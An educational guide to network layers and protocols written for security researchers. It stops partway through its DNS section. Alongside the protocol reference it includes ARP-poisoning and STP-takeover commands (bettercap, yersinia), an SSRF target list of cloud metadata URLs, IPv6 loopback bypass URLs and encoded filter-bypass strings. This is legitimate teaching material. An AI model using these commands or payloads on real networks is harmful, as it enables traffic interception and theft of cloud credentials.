# Network Architecture: Complete In-Depth Guide for Security Researchers

> **Purpose:** Build an airtight mental model of how networks actually work — from physical bits to application-layer sessions — so you can reason about attack surfaces, trace traffic paths, and exploit architecture-level weaknesses with precision.

---

## Table of Contents

1. [The Mental Model First](#1-the-mental-model-first)
2. [OSI Model — Deep Dive](#2-osi-model--deep-dive)
3. [TCP/IP Stack — The Real-World Model](#3-tcpip-stack--the-real-world-model)
4. [Physical Layer (Layer 1)](#4-physical-layer-layer-1)
5. [Data Link Layer (Layer 2)](#5-data-link-layer-layer-2)
6. [Network Layer (Layer 3)](#6-network-layer-layer-3)
7. [Transport Layer (Layer 4)](#7-transport-layer-layer-4)
8. [Session, Presentation, Application (Layers 5–7)](#8-session-presentation-application-layers-57)
9. [DNS — The Internet's Phone Book](#9-dns--the-internets-phone-book)
10. [HTTP/HTTPS — The Protocol You Attack Most](#10-httphttps--the-protocol-you-attack-most)
11. [TLS/SSL — Encryption Architecture](#11-tlsssl--encryption-architecture)
12. [Network Devices & Their Roles](#12-network-devices--their-roles)
13. [Subnetting, CIDR, and IP Addressing](#13-subnetting-cidr-and-ip-addressing)
14. [Routing Protocols](#14-routing-protocols)
15. [NAT & PAT](#15-nat--pat)
16. [Firewalls, WAFs, and IDS/IPS](#16-firewalls-wafs-and-idsips)
17. [VPNs and Tunneling Protocols](#17-vpns-and-tunneling-protocols)
18. [Load Balancers and Reverse Proxies](#18-load-balancers-and-reverse-proxies)
19. [CDNs and Edge Networks](#19-cdns-and-edge-networks)
20. [Cloud Network Architecture](#20-cloud-network-architecture)
21. [Wireless Network Architecture](#21-wireless-network-architecture)
22. [Network Protocols Reference](#22-network-protocols-reference)
23. [Packet Anatomy — Every Header Explained](#23-packet-anatomy--every-header-explained)
24. [Common Network Attack Surfaces](#24-common-network-attack-surfaces)
25. [Network Recon Methodology](#25-network-recon-methodology)
26. [Mental Models for Exploitation](#26-mental-models-for-exploitation)

---

## 1. The Mental Model First

Before memorizing protocols, you need one core mental model:

**Every network communication is a layered negotiation between two endpoints, mediated by devices that can only see what their layer exposes.**

This matters because:

- A **firewall at Layer 4** can't see Layer 7 payloads → WAF bypass opportunities
- A **router** strips the Layer 2 frame and rewrites it → ARP only matters on the local segment
- **NAT breaks end-to-end connectivity** → complicates SSRF, forces port forwarding
- **Each layer adds a header** → each header is an attack surface (header injection, smuggling, etc.)
- **Encapsulation is the core mechanism** → tunneling exploits this (DNS tunneling, HTTP tunneling)

```
Attacker's App Data
       |
       v
[Application Header][Data]          <- Layer 7
       |
       v
[Presentation/Session][App Header][Data]   <- Layer 5/6
       |
       v
[TCP/UDP Header][App Header][Data]   <- Layer 4 (Segment)
       |
       v
[IP Header][TCP Header][App Data]    <- Layer 3 (Packet)
       |
       v
[Frame Header][IP Pkt][Frame Trailer] <- Layer 2 (Frame)
       |
       v
[Encoded Bits on wire/radio]          <- Layer 1
```

**Security researcher's translation:** When you send a payload, it travels DOWN these layers on your side and UP on the target's side. Every box in the middle (proxy, WAF, LB) intercepts at some layer and forwards to the next. Understanding which layer each device operates at tells you what it can and cannot inspect.

---

## 2. OSI Model — Deep Dive

The OSI (Open Systems Interconnection) model is a **conceptual framework** with 7 layers. No protocol implements it perfectly — it's a thinking tool.

```
+---+-------------------+----------------------------------+------------------------+
| # | Layer             | Function                         | PDU Name               |
+---+-------------------+----------------------------------+------------------------+
| 7 | Application       | User-facing protocols            | Data / Message         |
| 6 | Presentation      | Encoding, encryption, compression| Data                   |
| 5 | Session           | Sessions, authentication dialogs | Data                   |
| 4 | Transport         | End-to-end delivery, port nums   | Segment (TCP)/Datagram |
| 3 | Network           | Logical addressing, routing      | Packet                 |
| 2 | Data Link         | Physical addressing (MAC), framing| Frame                 |
| 1 | Physical          | Bit transmission                 | Bit                    |
+---+-------------------+----------------------------------+------------------------+
```

### Why Each Layer Matters for Security

**Layer 7 (Application):** XSS, SQLi, SSRF, auth bypass, business logic, IDOR — most bug bounty findings live here.

**Layer 6 (Presentation):** SSL/TLS stripping attacks, encoding bypasses (Base64, URL encoding, Unicode normalization), XXE via different encodings.

**Layer 5 (Session):** Session fixation, session hijacking, cookie scope manipulation.

**Layer 4 (Transport):** Port scanning, SYN floods, TCP state manipulation, firewall evasion via fragmentation, UDP amplification attacks.

**Layer 3 (Network):** IP spoofing (where possible), ICMP-based attacks, route injection (BGP hijacking), SSRF to internal RFC1918 space.

**Layer 2 (Data Link):** ARP spoofing, MAC flooding (CAM table overflow), VLAN hopping, 802.1Q double-tagging.

**Layer 1 (Physical):** Physical tap, rogue AP, cable interception — usually out of scope for web bug bounty but relevant for physical pentests.

---

## 3. TCP/IP Stack — The Real-World Model

The actual internet runs on the **TCP/IP model**, which collapses OSI's 7 layers into 4:

```
+-------------------------+-----------------------------+
| TCP/IP Layer            | Corresponds to OSI          |
+-------------------------+-----------------------------+
| Application             | Layers 5, 6, 7              |
| Transport               | Layer 4                     |
| Internet (Network)      | Layer 3                     |
| Network Access (Link)   | Layers 1, 2                 |
+-------------------------+-----------------------------+
```

**Key protocols per layer:**

```
Application:   HTTP, HTTPS, DNS, FTP, SMTP, SSH, SNMP, RDP, OAuth, WebSocket
Transport:     TCP, UDP, QUIC, SCTP, DCCP
Internet:      IP (v4/v6), ICMP, IGMP, IPSec, OSPF, BGP
Network Access: Ethernet, Wi-Fi (802.11), ARP, PPP, Frame Relay
```

---

## 4. Physical Layer (Layer 1)

### What It Does
Converts bits to signals and back. Defines voltage levels, cable types, connector types, radio frequencies.

### Media Types

**Copper (UTP/STP):**
```
Cat5e:  1 Gbps,  100m
Cat6:   10 Gbps, 55m
Cat6a:  10 Gbps, 100m
Cat8:   40 Gbps, 30m (data centers)
```

**Fiber:**
```
Single-mode:  Long distance (km), laser light, narrow core (~9μm)
Multi-mode:   Short distance (300m-2km), LED light, wide core (50-62.5μm)
```

**Wireless:** Radio waves at specific frequencies (2.4GHz, 5GHz, 6GHz for Wi-Fi).

### Security Relevance
- Physical access = game over in most cases
- Rogue APs inject at Layer 1
- Evil twin attacks require physical proximity
- Fiber is harder to tap than copper (light leakage is detectable)
- Out-of-band management (IPMI, iDRAC) often runs on separate physical interfaces

---

## 5. Data Link Layer (Layer 2)

### What It Does
Provides **node-to-node** delivery within a single network segment. Handles:
- Physical addressing (MAC addresses)
- Framing (wrapping packets into frames)
- Error detection (CRC)
- Media Access Control (who can talk when)

### Ethernet Frame Structure

```
+----------+----------+----------+---------+----------+---------+
| Preamble | Dst MAC  | Src MAC  |  Type   | Payload  |   FCS   |
| 8 bytes  | 6 bytes  | 6 bytes  | 2 bytes | 46-1500B | 4 bytes |
+----------+----------+----------+---------+----------+---------+

Preamble: 7 bytes 0xAA + 1 byte 0xAB (SFD) — signals start of frame
Dst MAC:  Destination hardware address
Src MAC:  Source hardware address
Type:     0x0800 = IPv4, 0x0806 = ARP, 0x86DD = IPv6, 0x8100 = VLAN
Payload:  The encapsulated packet (or raw data)
FCS:      Frame Check Sequence — CRC-32 error detection
```

### MAC Addresses
```
Format:  XX:XX:XX:XX:XX:XX (48 bits, hexadecimal)
         |_______| |_______|
             OUI   Device ID
             
OUI (Organizationally Unique Identifier): First 3 bytes assigned by IEEE to vendors
Example: 00:50:56 = VMware, 00:0C:29 = VMware Workstation, 08:00:27 = VirtualBox

Broadcast MAC: FF:FF:FF:FF:FF:FF
Multicast:     First byte LSB = 1 (e.g., 01:00:5E:xx:xx:xx for IPv4 multicast)
```

**Attack insight:** MAC addresses can be spoofed trivially in software. MAC-based access controls (MAB on 802.1X networks) are trivially bypassed by sniffing a valid MAC and cloning it.

### ARP (Address Resolution Protocol)

ARP resolves IP addresses to MAC addresses within a local segment.

```
ARP Request (broadcast):
+--------+--------+--------+--------+--------+
| HW type| Proto  | HW len | PR len | Opcode |
| 0x0001 | 0x0800 | 0x06   | 0x04   | 0x0001 |
+--------+--------+--------+--------+--------+
| Sender MAC (6B)  | Sender IP (4B)           |
+------------------+--------------------------+
| Target MAC (6B)  | Target IP (4B)           |
| (00:00:00:00)    |                          |
+------------------+--------------------------+

Broadcast: "Who has 192.168.1.1? Tell 192.168.1.50"
Reply (unicast): "192.168.1.1 is at AA:BB:CC:DD:EE:FF"
```

**ARP Cache:**  
Each host maintains an ARP cache (IP→MAC mappings). Default TTL is short (seconds to minutes).

**ARP Spoofing Attack:**
```
Normal:
  Host A (192.168.1.10) --> ARP Cache: [192.168.1.1 = Router_MAC]

Attack:
  Attacker sends gratuitous ARP:
  "192.168.1.1 is at Attacker_MAC"
  
  Host A ARP Cache poisoned: [192.168.1.1 = Attacker_MAC]
  Host A sends traffic for gateway --> Attacker (MitM)
```

Tools: `arpspoof`, `ettercap`, `bettercap`
```bash
# ARP poison with bettercap
sudo bettercap -iface eth0
# In bettercap:
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

### VLANs (Virtual LANs)

VLANs segment a physical network into isolated logical networks at Layer 2.

**802.1Q VLAN Tagging:**
```
Normal Ethernet Frame:
+----------+--------+--------+---------+----------+
| Preamble | DstMAC | SrcMAC | EtherType | Payload |
+----------+--------+--------+-----------+---------+

802.1Q Tagged Frame:
+----------+--------+--------+-------+--------+----------+---------+
| Preamble | DstMAC | SrcMAC | 0x8100| TCI    | EtherType| Payload |
+----------+--------+--------+-------+--------+----------+---------+
                              |TPID  |3b PCP + 1b DEI + 12b VLAN ID|
                              
VLAN ID: 12 bits = 4096 possible VLANs (0 and 4095 reserved)
```

**VLAN Hopping — Double Tagging Attack:**
```
Attacker (on VLAN 10) crafts frame with TWO 802.1Q tags:
  Outer tag: VLAN 10 (native/access VLAN of attacker port)
  Inner tag: VLAN 20 (target VLAN)

Switch 1 (trunk port): strips outer tag (VLAN 10), forwards
Switch 2: sees inner tag (VLAN 20), delivers to VLAN 20 target

Requirement: Attacker must be on same native VLAN as trunk port
Attack is ONE-WAY — no return traffic
```

### Spanning Tree Protocol (STP)

STP prevents Layer 2 loops by electing a Root Bridge and blocking redundant paths.

```
Network with redundant links:
        Root Bridge (lowest Bridge ID)
        /         \
    Switch A     Switch B
        \         /
         Switch C
         
STP blocks one of Switch C's uplinks to prevent loop.
```

**STP Attack (Root Bridge Takeover):**
```bash
# Send superior BPDU to become root bridge
# Tools: Yersinia
yersinia stp -attack 4  # Claim root role
# Effect: All traffic rerouted through attacker = MitM
```

---

## 6. Network Layer (Layer 3)

### What It Does
Handles **logical addressing** (IP) and **routing** — getting packets from source to destination across multiple networks.

### IPv4 Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if IHL > 5)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Version:    4 (IPv4) or 6 (IPv6)
IHL:        Internet Header Length in 32-bit words (min 5 = 20 bytes)
ToS/DSCP:   Quality of Service markings (Differentiated Services)
Total Len:  Entire packet size including header (max 65535 bytes)
ID:         Used for fragment reassembly
Flags:      Bit 0: Reserved (0), Bit 1: DF (Don't Fragment), Bit 2: MF (More Fragments)
Frag Offset: Position of this fragment in original datagram
TTL:        Decremented by 1 at each hop; packet dropped at 0 (prevents loops)
Protocol:   6=TCP, 17=UDP, 1=ICMP, 89=OSPF, 47=GRE, 50=ESP, 51=AH
Checksum:   Header integrity check (NOT payload)
```

**Security relevance of key fields:**
- **TTL:** Used in traceroute (sends packets with TTL=1,2,3...); can fingerprint OS (Windows default TTL=128, Linux=64)
- **DF bit:** If set and packet too big, router sends ICMP "Fragmentation Needed" → used in Path MTU Discovery, can reveal internal network info
- **Fragmentation:** IDS/WAF bypass by splitting payload across fragments; reassembly at endpoint
- **Protocol field:** GRE (47) tunneling, ESP (50) for IPSec — can encapsulate arbitrary traffic

### IPv4 Address Classes and Special Ranges

```
Class A: 1.0.0.0   - 126.255.255.255 (/8 default mask)
Class B: 128.0.0.0 - 191.255.255.255 (/16 default mask)
Class C: 192.0.0.0 - 223.255.255.255 (/24 default mask)
Class D: 224.0.0.0 - 239.255.255.255 (Multicast)
Class E: 240.0.0.0 - 255.255.255.255 (Reserved)

Private (RFC 1918):
  10.0.0.0/8        (16,777,216 addresses)
  172.16.0.0/12     (1,048,576 addresses)
  192.168.0.0/16    (65,536 addresses)

Special:
  127.0.0.0/8       Loopback
  169.254.0.0/16    Link-local (APIPA — when DHCP fails)
  0.0.0.0/8         "This network" — source when host has no IP
  255.255.255.255   Limited broadcast
  100.64.0.0/10     Shared address space (ISP NAT, RFC 6598)

Cloud Metadata (CRITICAL for SSRF):
  169.254.169.254   AWS/GCP/Azure instance metadata
  fd00:ec2::254     AWS IPv6 metadata endpoint
  metadata.google.internal  GCP metadata
```

**SSRF target list from these ranges:**
```
http://169.254.169.254/latest/meta-data/                  # AWS EC2 Metadata
http://169.254.169.254/latest/user-data/                  # AWS user-data (often has secrets)
http://metadata.google.internal/computeMetadata/v1/       # GCP
http://169.254.169.254/metadata/instance?api-version=2021 # Azure
http://100.100.100.200/latest/meta-data/                  # Alibaba Cloud
```

### IPv6

```
IPv6 Header:
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| Traffic Class |           Flow Label                  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Payload Length        |  Next Header  |   Hop Limit   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                                                               +
|                         Source Address                        |
+                       (128 bits / 16 bytes)                   +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                                                               +
|                      Destination Address                      |
+                       (128 bits / 16 bytes)                   +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Key differences from IPv4:
- No checksum (handled by upper layers)
- No fragmentation by routers (only at source)
- No broadcast (multicast replaces it)
- Built-in IPSec support
- 128-bit addresses: 2^128 = 340 undecillion addresses

IPv6 Special Addresses:
  ::1           Loopback
  ::            Unspecified
  fe80::/10     Link-local (auto-assigned, NOT routable)
  fc00::/7      Unique local (like RFC 1918 private)
  ff00::/8      Multicast
  2001:db8::/32 Documentation/examples

SSRF with IPv6:
  http://[::1]/admin              # Loopback bypass
  http://[::ffff:127.0.0.1]/      # IPv4-mapped IPv6 loopback
  http://[0:0:0:0:0:ffff:7f00:1]/ # Same as above
```

**IPv6 Security Issues:**
- Many firewalls/WAFs don't inspect IPv6 traffic
- IPv6 tunneling (6in4, Teredo) can bypass L4 firewalls
- Dual-stack hosts may be reachable via IPv6 even when IPv4 is filtered
- NDP (Neighbor Discovery Protocol) replaces ARP — NDP spoofing equivalent of ARP spoofing

### ICMP

ICMP provides error reporting and diagnostics at Layer 3.

```
ICMP Header:
+--------+--------+------------------+
|  Type  |  Code  |    Checksum      |
| 1 byte | 1 byte |    2 bytes       |
+--------+--------+------------------+
|         Rest of Header             |
|           (4 bytes)                |
+------------------------------------+
|         Data (variable)            |
+------------------------------------+

Common Types:
  0  = Echo Reply       (ping response)
  3  = Destination Unreachable
       Code 0: Net unreachable
       Code 1: Host unreachable
       Code 3: Port unreachable
       Code 4: Fragmentation needed (DF set)
       Code 13: Communication administratively prohibited (firewall)
  4  = Source Quench (deprecated)
  5  = Redirect (routing — can be abused)
  8  = Echo Request    (ping)
  11 = Time Exceeded
       Code 0: TTL exceeded in transit (traceroute response)
       Code 1: Fragment reassembly time exceeded
  12 = Parameter Problem
```

**ICMP Security Uses:**
```bash
# Traceroute (Linux uses UDP, Windows uses ICMP, -I forces ICMP on Linux)
traceroute -I target.com   # ICMP traceroute
traceroute -T target.com   # TCP traceroute (port 80, bypasses ICMP filters)

# Ping sweep
nmap -sn 192.168.1.0/24    # Sends ICMP + ARP

# ICMP tunnel (DNS-like C2 over ICMP)
# Tools: icmptunnel, ptunnel-ng
# Data hidden in ICMP payload field (8+ bytes available)

# Firewall recon via ICMP responses:
# ICMP type 3 code 13 = "admin prohibited" = firewall dropping
# No response = stealth firewall or host down
# ICMP type 3 code 3 = "port unreachable" = host up, port closed
```

---

## 7. Transport Layer (Layer 4)

### TCP — Transmission Control Protocol

TCP provides **reliable, ordered, connection-oriented** delivery.

#### TCP Header

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window            |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options                    |    Padding    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Source Port:    16-bit (0-65535), ephemeral if client (typically 49152-65535)
Dest Port:      16-bit, service port on server side
Seq Number:     32-bit, position of first byte in this segment in the stream
Ack Number:     32-bit, next expected byte from other side (if ACK flag set)
Data Offset:    Header length in 32-bit words (min 5 = 20 bytes)
Flags (6 bits):
  URG: Urgent pointer valid (rarely used)
  ACK: Acknowledgment number valid (set in all packets after handshake)
  PSH: Push — deliver data to application immediately without buffering
  RST: Reset — abruptly terminate connection (error or port closed)
  SYN: Synchronize sequence numbers (connection initiation)
  FIN: No more data from sender (graceful close)
Window:         Flow control — how much data sender can send before needing ACK
Checksum:       Covers header + data + pseudo-header (src IP, dst IP, protocol, length)
Urgent Pointer: Offset to urgent data (if URG set)
```

#### TCP Three-Way Handshake

```
Client                          Server
  |                               |
  |------SYN (seq=x)------------->|   Client sends SYN with Initial Seq Num x
  |                               |
  |<-----SYN-ACK (seq=y,ack=x+1)-|   Server acknowledges x+1, sends own ISN y
  |                               |
  |------ACK (ack=y+1)----------->|   Client acknowledges y+1
  |                               |
  |<======DATA TRANSFER==========>|   Connection established
  |                               |
```

**Why ISN (Initial Sequence Number) matters:**
- ISNs are pseudo-random to prevent session hijacking
- Old systems had predictable ISNs → TCP hijacking attacks
- Modern OS ISNs: cryptographically random

**Port States and Nmap scan types:**

```
TCP Connect Scan (nmap -sT):
  Open port:
    Client: SYN -->
    Server: <-- SYN-ACK
    Client: ACK -->
    Client: RST --> (closes connection)
  
  Closed port:
    Client: SYN -->
    Server: <-- RST-ACK (immediate reset)
  
  Filtered port:
    Client: SYN -->
    (no response or ICMP unreachable)

SYN Scan (nmap -sS, "half-open" — requires root):
  Open port:
    Client: SYN -->
    Server: <-- SYN-ACK
    Client: RST --> (never completes — not logged by app)
  
  Closed port:
    Client: SYN -->
    Server: <-- RST
  
  Filtered:
    Client: SYN -->
    (no response)

ACK Scan (nmap -sA) — Firewall detection, NOT port detection:
  Unfiltered:  Server sends RST (either open or closed, firewall passes it)
  Filtered:    No response (firewall drops)
  
FIN/NULL/Xmas Scans (nmap -sF/-sN/-sX) — IDS evasion:
  RFC compliant: Closed = RST, Open = no response
  Windows ignores RFC → always RST → not useful on Windows targets
  
UDP Scan (nmap -sU) — slow, unreliable:
  Open: No response (app receives it) or app-specific response
  Closed: ICMP Port Unreachable (type 3, code 3)
  Filtered: No response or ICMP admin prohibited
```

#### TCP Connection Termination

```
Active Close (e.g., Client initiates):
Client                          Server
  |                               |
  |------FIN (seq=m)------------->|   Client: "I'm done sending"
  |                               |
  |<-----ACK (ack=m+1)-----------|   Server: "Got it, still sending"
  |                               |
  |<-----FIN (seq=n)-------------|   Server: "I'm done too"
  |                               |
  |------ACK (ack=n+1)----------->|   Client: ACK
  |                               |
  TIME_WAIT (2*MSL = ~4 minutes)
  
RST (abrupt close):
  One side sends RST
  Other side immediately terminates — no graceful close
  Used when: connection error, port scan, firewall injection
```

**TCP Sequence Number Manipulation (HTTP Request Smuggling prerequisite):**
The key insight is that TCP is a byte stream. HTTP/1.1 parsers differ in where they see message boundaries → desynchronizes front-end and back-end → request smuggling.

#### TCP Flow Control and Congestion Control

**Window size:** Receiver advertises how many bytes it can accept. If window = 0, sender must stop (zero window = can detect via Wireshark).

**Congestion control algorithms:**
```
Slow Start:    cwnd starts small, doubles each RTT until ssthresh
AIMD:          Additive Increase (1 per RTT), Multiplicative Decrease (halve on loss)
CUBIC:         Modern Linux default, aggressive ramp-up
BBR (Google):  Model-based, doesn't rely on loss as signal
```

**Security implication:** Window size in RST packets doesn't need to match — this allows TCP RST injection attacks (ISPs used this for censorship; also used in IDS to inject RSTs).

### UDP — User Datagram Protocol

```
UDP Header:
+--------+--------+--------+--------+
| Source | Dest   | Length | Chksum |
| Port   | Port   |        |        |
| 2 bytes| 2 bytes| 2 bytes| 2 bytes|
+--------+--------+--------+--------+

Total header: 8 bytes (vs TCP's 20+ bytes)
No connection, no reliability, no ordering
Fire-and-forget: application handles retransmission if needed
```

**When UDP is used:**
- DNS (port 53) — query/response fits in one datagram
- DHCP (67/68)
- SNMP (161/162)
- NTP (123)
- QUIC (HTTP/3)
- VoIP (RTP)
- Gaming (latency > reliability)
- TFTP (69)
- Syslog (514)

**UDP Amplification DDoS:**
```
Attacker spoofs victim's IP in UDP request to reflector:
  Spoofed: [Victim IP]--UDP(small request)-->[Reflector: DNS/NTP/SSDP]
  Reflector sends large response to Victim
  
Amplification factors:
  DNS: 28-54x (ANY query)
  NTP: 556x (monlist command — CVE-2013-5211)
  SSDP: 30x
  Memcached: 51,000x (UDP port 11211 — CVE-2018-1000115)
  
Real-world: 2018 GitHub DDoS used Memcached, peaked at 1.35 Tbps
```

### QUIC — The New Transport

QUIC (Quick UDP Internet Connections) is HTTP/3's transport, built on UDP.

```
QUIC Features:
- Multiplexed streams without head-of-line blocking (unlike HTTP/2 over TCP)
- 0-RTT connection establishment (replay attack concern)
- Built-in TLS 1.3
- Connection migration (IP change doesn't break connection — uses connection ID)
- No cleartext headers visible to middleboxes

QUIC Packet Structure:
+------------------+
| Header Form (1b) |
| Fixed Bit    (1b)|
| Packet Type  (2b)|
| Reserved     (2b)|
| Packet Num Len(2b|
+------------------+
| Version (4 bytes)|
+------------------+
| DCID Length (1B) |
| Dest Conn ID     |  <- Connection ID, not 5-tuple
+------------------+
| SCID Length (1B) |
| Src Conn ID      |
+------------------+
| Token Length     |  <- Retry token
| Token            |
+------------------+
| Length + Pkt Num |
+------------------+
| Payload (encrypted)|
+------------------+

Security concerns:
- 0-RTT data can be replayed (GET requests replayed = SSRF if server doesn't deduplicate)
- Middlebox (WAF/IDS) inspection of QUIC is harder — more encrypted
- Connection migration can bypass IP-based rate limiting
```

### Port Numbers Reference

```
Well-known ports (0-1023): Require root/admin to bind
Registered ports (1024-49151): Assigned by IANA
Dynamic/Ephemeral (49152-65535): Client-side connections

Critical service ports:
  20,21  FTP (data, control)
  22     SSH
  23     Telnet (cleartext!)
  25     SMTP
  53     DNS (UDP + TCP)
  67,68  DHCP (server, client)
  69     TFTP
  80     HTTP
  110    POP3
  111    RPC / portmapper
  123    NTP
  135    MS RPC
  137-139 NetBIOS
  143    IMAP
  161,162 SNMP (agent, trap)
  389    LDAP
  443    HTTPS
  445    SMB (Windows file sharing)
  465    SMTPS
  514    Syslog (UDP)
  587    SMTP submission
  636    LDAPS
  993    IMAPS
  995    POP3S
  1433   MSSQL
  1521   Oracle DB
  2049   NFS
  2181   Zookeeper
  3306   MySQL/MariaDB
  3389   RDP
  4444   Metasploit default
  5432   PostgreSQL
  5672   AMQP (RabbitMQ)
  5900   VNC
  6379   Redis (often unauth!)
  6443   Kubernetes API
  7001   WebLogic
  8080   HTTP alternate / Tomcat
  8443   HTTPS alternate
  8888   Jupyter Notebook (often unauth!)
  9000   PHP-FPM / SonarQube
  9042   Cassandra
  9200   Elasticsearch (often unauth!)
  11211  Memcached (UDP amplification)
  27017  MongoDB (often unauth!)
  50070  Hadoop NameNode
```

---

## 8. Session, Presentation, Application (Layers 5–7)

### Layer 5 — Session Layer

Manages **sessions** — logical connections between applications.

**Mechanisms:**
- **Checkpointing:** Allows resumption after failure
- **Dialog control:** Half-duplex vs. full-duplex
- **Session termination:** Graceful vs. abrupt

**Protocols:** RPC, NetBIOS sessions, PPTP (control channel), SIP

**Security relevance:**
- Session fixation: Attacker sets session ID before auth, victim authenticates, attacker inherits session
- Session puzzling: Application uses same session variable for different purposes

### Layer 6 — Presentation Layer

**Handles encoding, serialization, compression, encryption.**

Functions:
- Character encoding: ASCII, UTF-8, UTF-16, EBCDIC
- Data serialization: JSON, XML, ASN.1, Protocol Buffers
- Compression: gzip, deflate, brotli
- Encryption: SSL/TLS (operates here conceptually)

**Security relevance:**
- **Unicode normalization attacks:** Different encodings for same character bypass filters
  ```
  Path traversal via Unicode: %c0%ae%c0%ae/ normalizes to ../
  XSS via encoding: <script> encoded as &#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
  SQL injection via encoding: ' as %27 or ＇ (fullwidth apostrophe U+FF07)
  ```
- **Deserialization vulnerabilities:** Malicious objects in serialized formats (Java, PHP, Python pickle, .NET)
- **XXE via encoding:** UTF-16 encoded XML to bypass UTF-8 WAF filters

### Layer 7 — Application Layer

Where everything interesting happens. Covered in dedicated sections below (HTTP, DNS, etc.).

---

## 9. DNS — The Internet's Phone Book

DNS (Domain Name System) translates human-readable names to IP addresses.

### DNS Architecture

```
DNS Hierarchy:

                         . (Root)
                        /|\
                       / | \
               .com  .org  .net  .io   ...
               /  \
           google  amazon
           /    \
         www    mail

Resolution path for "www.example.com":
  Client --> Recursive Resolver (ISP or 8.8.8.8)
  Resolver --> Root Server (.) "Who handles .com?"
  Root --> "Use .com TLD servers: a.gtld-servers.net, etc."
  Resolver --> .com TLD server "Who handles example.com?"
  TLD --> "Use example.com nameservers: ns1.example.com"
  Resolver --> ns1.example.com "What is www.example.com?"
  ns1 --> "192.0.2.1" (authoritative answer)
  Resolver --> Client (cached per TTL)
```

### DNS Packet Structure

```
DNS Message Format:
+------------------------------------------+
|            Header (12 bytes)             |
+------------------------------------------+
|            Question Section              |
+------------------------------------------+
|            Answer Section                |
+------------------------------------------+
|          Authority Section               |
+------------------------------------------+
|          Additional Section              |
+------------------------------------------+

Header (12 bytes):
 0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID                      |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR| Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ANCOUNT                   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    NSCOUNT                   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ARCOUNT                   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

QR:     0=Query, 1=Response
Opcode: 0=Standard query, 1=Inverse query, 2=Status
AA:     Authoritative Answer
TC:     Truncated (message too long for UDP, retry with TCP)
RD:     Recursion Desired
RA:     Recursion Available
RCODE:  0=NoError, 1=FormatError, 2=ServFail, 3=NXDomain, 5=Refused

Question Section:
+------------------------------------------+
| QNAME (variable): encoded domain name    |
| Each label preceded by length byte       |
| e.g., 3www7example3com0                  |
+------------------------------------------+
| QTYPE  (2 bytes): record type            |
